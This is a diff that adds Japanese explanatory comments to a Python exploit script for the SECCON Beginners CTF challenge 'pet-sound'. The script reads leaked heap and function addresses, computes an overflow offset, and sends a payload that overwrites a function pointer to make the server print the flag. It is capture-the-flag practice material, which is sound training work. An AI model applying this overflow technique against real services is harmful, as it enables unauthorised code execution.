@@ -2,35 +2,44 @@ import socket
 import re
 import struct
 
+# 接続先ホストとポート（問題文に従う）
 HOST = 'pet-sound.challenges.beginners.seccon.jp'
 PORT = 9090
 
+# サーバーにTCP接続を確立
 s = socket.create_connection((HOST, PORT))
 
-# バナー全受信
+# プログラムからの初期メッセージをすべて受信（バナー情報＋プロンプト）
 data = b""
 while b"Input a new cry for Pet A > " not in data:
     data += s.recv(4096)
 
+# 受信したバナーを表示（デバッグ用）
 print(data.decode())
 
-# アドレスパース
+# 正規表現でヒントから各アドレスを抽出
 flag_addr = int(re.search(br"speak_flag.*?: (0x[0-9a-f]+)", data).group(1), 16)
 pet_a     = int(re.search(br"Pet A is allocated at: (0x[0-9a-f]+)", data).group(1), 16)
 pet_b     = int(re.search(br"Pet B is allocated at: (0x[0-9a-f]+)", data).group(1), 16)
 
-# soundフィールドから pet_B->speak までの実オフセット
-offset = (pet_b - pet_a) - 8  # pet_A->sound は pet_A + 0x08
+# 構造体の中で pet_A->sound は pet_A の 8バイト後（speak ポインタ分）にあるので調整
+# pet_B->speak までのバッファオーバーフロー距離を計算
+offset = (pet_b - pet_a) - 8  # -8 は sound フィールド開始位置調整
 
+# アドレスの確認出力（デバッグ用）
 print(f"[+] speak_flag = {hex(flag_addr)}")
 print(f"[+] offset = {offset}")
 
+# 攻撃ペイロードを作成：
+# - "A" を offset バイトぶん詰めて、
+# - speak_flag のアドレス（リトルエンディアン）で pet_B->speak を上書き
 payload = b"A" * offset + struct.pack("<Q", flag_addr)
 
-# 送信（48バイトになるように）
+# 攻撃用入力を送信
+# 最後に改行文字を入れて、read() に入力終了を伝える
 s.sendall(payload + b"\n")
 
-# 出力読み取り
+# サーバーからの出力を受け取って表示（フラグが含まれている）
 while True:
     try:
         res = s.recv(1024)
@@ -40,4 +49,5 @@ while True:
     except:
         break
 
+# 接続をクローズ
 s.close()
